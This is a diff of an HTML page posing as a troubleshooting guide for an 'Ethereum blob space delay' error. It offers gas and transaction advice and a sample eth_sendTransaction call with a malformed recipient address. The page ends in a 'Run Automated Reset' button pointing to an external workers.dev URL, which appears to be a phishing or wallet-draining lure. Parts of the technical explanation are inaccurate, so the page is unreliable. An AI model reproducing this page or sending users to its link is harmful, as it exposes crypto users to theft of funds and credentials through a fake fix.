@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Ethereum Blob Space Delay</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: sans-serif;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #cf6679; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,30 +41,34 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a "blob space delay" or similar issues related to data storage and retrieval.</li>
+<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a "blob space delay" or similar issues related to exceeding the maximum allowed blob space.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to the Ethereum network's current limitations in handling large amounts of data, particularly with the storage and retrieval of blobs (binary large objects). This can be exacerbated by network congestion, high gas prices, and the inherent design of the Ethereum blockchain.</li>
+<li>The error occurs due to the Ethereum network's limit on the amount of blob data that can be included in a block. When this limit is exceeded, transactions are delayed until the network can process them without violating the blob space constraint.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit for transactions to prioritize blob storage and retrieval.</li>
-<li>Utilize off-chain storage solutions for large data files, reducing the load on the Ethereum network.</li>
-<li>Implement a queueing system for blob uploads to manage network congestion:</li>
+<li>Increase the gas limit for transactions to prioritize them over others, potentially reducing delay times:</li>
+<li>Adjust transaction settings to use a higher gas price</li>
+<li>Utilize layer 2 scaling solutions to offload some data from the main chain</li>
+<li>Implement data compression techniques to reduce the size of blob data</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;value&quot;:&quot;0x...&quot;,&quot;gas&quot;:&quot;0x...&quot;,&quot;gasPrice&quot;:&quot;0x...&quot;}]}&#39;</span>
+<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="o">({</span>
+<span class="w">  </span><span class="s2">&quot;from&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;to&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x55241586d50469745864804697458648046974&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;value&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x186a0&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;gas&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x5208&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;gasPrice&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x186a0&quot;</span>
+<span class="o">})</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and network monitoring. </p>
+<p>Consider using an external console for more advanced transaction management and customization.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Basic understanding of Ethereum network architecture</li>
-<li>Familiarity with gas management and transaction prioritization</li>
-<li>Access to a local Ethereum node or remote API endpoint</li>
+<li>Basic understanding of Ethereum transaction mechanics</li>
+<li>Familiarity with gas pricing and transaction prioritization</li>
+<li>Access to a compatible Ethereum client or wallet for executing custom transactions</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
